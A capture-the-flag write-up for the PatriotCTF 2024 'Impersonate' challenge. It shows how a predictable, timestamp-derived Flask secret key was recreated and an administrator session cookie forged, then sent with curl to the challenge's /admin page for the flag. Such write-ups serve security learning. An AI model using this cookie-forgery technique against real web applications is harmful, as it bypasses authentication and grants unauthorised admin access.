# PatriotCTF 2024 - Impersonate
**Title:** Impersonate

**Description:** One may not be the one they claim to be.

http://chal.competitivecyber.club:9999/

**Files:** [app.py](https://github.com/xtasy94/CTFW/blob/main/PatriotCTF%202024/Impersonate/Files/app.py)

## Solution: 
The challenge was a Flask-based web application that used session cookies to manage user authentication. The goal was to obtain administrative access by forging a session cookie for the "administrator" user.
Upon inspecting the application, I discovered that it relied on **Flask sessions** to store user data in cookies. Flask uses signed cookies, meaning the session data is stored on the client side but signed with the server's `secret_key` to prevent tampering.
The challenge's admin page checked if a session contained:
- `username = "administrator"`
- `is_admin = True`
This would grant access to the flag if the signature of the session cookie matched the server's secret key.

Now I had to recreate the `secure_key`, I analyzed the code and noticed the server's secret key was being generated as follows:
```python
secure_key = hashlib.sha256(f'secret_key_{server_start_str}'.encode()).hexdigest()
```

The `server_start_str` was provided as `20240921140015`. I used this to recreate the exact secret key the server used by applying the same hashing process in my script.
I generated the `admin_uid` using the same `UUID` mechanism found in app.py, ensuring it would match the admin UUID that the application expected.
I ran the script and generated the session cookie:
```bash
$ python3 jwt.py
Generated session cookie: eyJ1c2VybmFtZSI6ImFkbWluaXN0cmF0b3IiLCJpc19hZG1pbiI6dHJ1ZSwidWlkIjoiMDJlYzE5ZGMtYmIwMS01OTQyLWE2NDAtNzA5OWNkYTc4MDgxIn0.Zu7TJg.0e-zkBBPxeCa5V8vxeDiu9AZAMg
```

Now that we have generated the session cookie, I crafted a curl command to send to `http://chal.competitivecyber.club:9999/`:
```bash
curl --request GET \
  --url http://chal.competitivecyber.club:9999/admin \
  --header 'Cookie: session=eyJ1c2VybmFtZSI6ImFkbWluaXN0cmF0b3IiLCJpc19hZG1pbiI6dHJ1ZSwidWlkIjoiMDJlYzE5ZGMtYmIwMS01OTQyLWE2NDAtNzA5OWNkYTc4MDgxIn0.Zu7TJg.0e-zkBBPxeCa5V8vxeDiu9AZAMg'
```

And I get the flag in response:
```
PCTF{Imp3rs0n4t10n_Iz_Sup3r_Ezz}
```